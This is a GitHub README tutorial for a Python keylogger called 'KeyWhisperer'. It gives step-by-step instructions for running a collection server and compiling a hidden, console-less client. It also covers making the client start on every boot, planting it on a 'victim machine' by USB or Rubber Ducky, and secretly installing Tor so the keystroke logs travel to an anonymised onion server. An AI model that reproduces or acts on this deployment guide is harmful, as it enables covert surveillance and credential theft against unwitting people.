# KeyWhisperer
Welcome to the "KeyWhisperer: Keylogger with Python" tutorial, where we'll delve into the fascinating world of keystroke monitoring using Python. In this enthralling journey, we'll explore how to create a powerful keylogger that captures keyboard strokes, opening the door to a deeper understanding of network security testing and system administration. Unravel the mysteries of Python's hidden capabilities, and let the KeyWhisperer guide you through the exciting realm of cybersecurity. Embrace the adventure and discover the limitless possibilities that await you!

In this tutorial, we will cover the following topics:

1. Setting up the project environment and required libraries
2. Creating a server-side script to receive keyboard strokes
3. Developing a client-side script to be executed on the victim machine
4. Setting up the tool to run automatically on system startup on victim machine
5. Run the scripts on the victim machine
<br>

## Installation
Install the source code:
```
git clone https://github.com/BlurryFace04/KeyWhisperer.git
cd KeyWhisperer
```

Setup virtual environment in Windows (optional):
```
python -m venv venv
call venv\Scripts\activate
```

Setup virtual environment in Linux (optional):
```
python3 -m venv venv
source venv/bin/activate
```

Install libraries:
```
pip install -r requirements.txt
```
<br>

## Server
It is highly recommended to consider renting a dedicated/shared server or a virtual private server (VPS) for hosting your keylogger server script. By utilizing a rented server, you can gain remote access and control over your keylogger from any location, rather than being limited to a local area network (LAN) when using a home PC or laptop. This approach significantly enhances the flexibility and reach of your keylogger, enabling more efficient monitoring and management across various network environments. 

For this tutorial, we will be using an Ubuntu Server.

Once you have set up your server environment, ensure that your [server script](https://github.com/BlurryFace04/KeyWhisperer/edit/main/server.py) is uploaded to the server. Then, initiate the [server script](https://github.com/BlurryFace04/KeyWhisperer/edit/main/server.py) by executing the following command:
```
python3 server.py
```
Upon successful execution, your server will be up and running, actively listening for incoming connections from your keylogger clients.

Once connected, it will be saving the key logs in a file named "whispered.txt".
<br><br><br>


## Client
To prepare the [client script](https://github.com/BlurryFace04/KeyWhisperer/edit/main/client.py) for execution on the target machine, you'll need to convert it into an executable (.exe) file using PyInstaller. This process makes it easier to run the script on the target system without even requiring a separate Python installation on the target machine.

Change the Server IP Address and run the following command to convert your [client script](https://github.com/BlurryFace04/KeyWhisperer/edit/main/client.py) into a standalone executable:
```
pyinstaller --onefile --noconsole --icon=icon.ico client.py
```
**Note:** The [client script](https://github.com/BlurryFace04/KeyWhisperer/edit/main/client.py) provided can be executed on both Windows and Linux operating systems.
<br><br><br>

## Run script on startup
In order to ensure that the keylogger runs automatically every time the target system starts, you can use the [startup script](https://github.com/BlurryFace04/KeyWhisperer/edit/main/startup.py).

Run the following command to convert your [startup script](https://github.com/BlurryFace04/KeyWhisperer/edit/main/startup.py) into a standalone executable:
```
pyinstaller --onefile --noconsole --icon=icon.ico startup.py
```
This will copy the client.exe file to any desired location which can be edited in the [startup script](https://github.com/BlurryFace04/KeyWhisperer/edit/main/startup.py) and create a shortcut to the client.exe file in the Windows Startup folder, ensuring that the keylogger runs every time the system starts.
<br><br><br>

## Execution
After generating the executable files, you will find the client.exe and startup.exe files within the dist folder created by PyInstaller.

To deploy the keylogger on the target machine, transfer both files using an appropriate method, such as a USB flash drive, a Rubber Ducky, or another suitable technique.

Once connected to the target system, execute both the executables to initiate the keylogging process.

### USB Flash Drive:
If using a USB flash drive, simply execute the client.exe and startup.exe files. This will initiate the keylogger and copy the client.exe file to the pre-defined location on the target system and create a shortcut in the Windows Startup folder, ensuring the keylogger is launched each time the system starts.

### Rubber Ducky:
You can create a script for Rubber Ducky using the following steps:

1. Use the [payload.txt](https://github.com/BlurryFace04/KeyWhisperer/edit/main/payload.txt) provided in the source code and create a inject.bin (binary payload file) from [Hak5 PayloadStudio](https://payloadstudio.hak5.org/community/)
2. Copy the inject.bin, client.exe and startup.exe files to the root of the Rubber Ducky's microSD card.
3. Insert the Rubber Ducky into the target system and the payload script will automatically execute both the executables. 
<br>

## Setup TOR Hidden Service on Server
You might have noticed that in the [client script](https://github.com/BlurryFace04/KeyWhisperer/edit/main/client.py) we have explicitly mentioned our Server IP Address, which is a potential vulnerability. So to anonymize the server, we will be using the tor network to establish communication between the client and the server.

**Note:** Using Tor Hidden Service is optional but is recommended for your anonymity.

Let's procees to the installation part.

Install tor using the following command:
```
sudo apt install tor -y
```

Next, edit the Tor configuration file, torrc. The file is located at '/etc/tor/torrc'.
```
sudo nano /etc/tor/torrc
```

Uncomment or add the following lines:
```
SocksPort 9050
HiddenServiceDir /var/lib/tor/hidden_service/
HiddenServicePort 80 127.0.0.1:8084
```

Finally, restart Tor so it picks up your new configuration:
```
sudo systemctl restart tor
```

The hostname of your hidden service will be in '/var/lib/tor/hidden_service/hostname'. You can display it with:
```
sudo cat /var/lib/tor/hidden_service/hostname
```
Save this onion address because it will be used in the next step.
<br><br><br>

## Install TOR secretly on victim machine
This [install_tor script](https://github.com/BlurryFace04/KeyWhisperer/edit/main/install_tor.py) will secretly download, extract, and configure Tor without installing it as a service on the victim machine.
Run the following command to convert your [install_tor script](https://github.com/BlurryFace04/KeyWhisperer/edit/main/install_tor.py) into a standalone executable:
```
pyinstaller --onefile --noconsole --icon=icon.ico install_tor.py
```

**Note:** This script can only be used on a windows machine.
<br><br><br>

## TOR Client Script
You will have to use this [tor_client script](https://github.com/BlurryFace04/KeyWhisperer/edit/main/tor_client.py) instead of the [client script](https://github.com/BlurryFace04/KeyWhisperer/edit/main/client.py) we used before, if you want to enable the commnication of server and client via tor network.
Run the following command to convert your [tor_client script](https://github.com/BlurryFace04/KeyWhisperer/edit/main/install_tor.py) into a standalone executable:
```
pyinstaller --onefile --noconsole --icon=icon.ico tor_client.py
```
**Note:** You can keep using the same server script even for communication via tor.
<br><br><br>

## Bugs, Issues and Contributing
If you find bugs or have suggestions about improving the module, don't hesitate to contact me.
<br><br><br>

## License
This project is licensed under the MIT License - see the [LICENSE](https://github.com/BlurryFace04/KeyWhisperer/edit/main/LICENSE) file for details

Copyright (c) 2023 Blurry Face
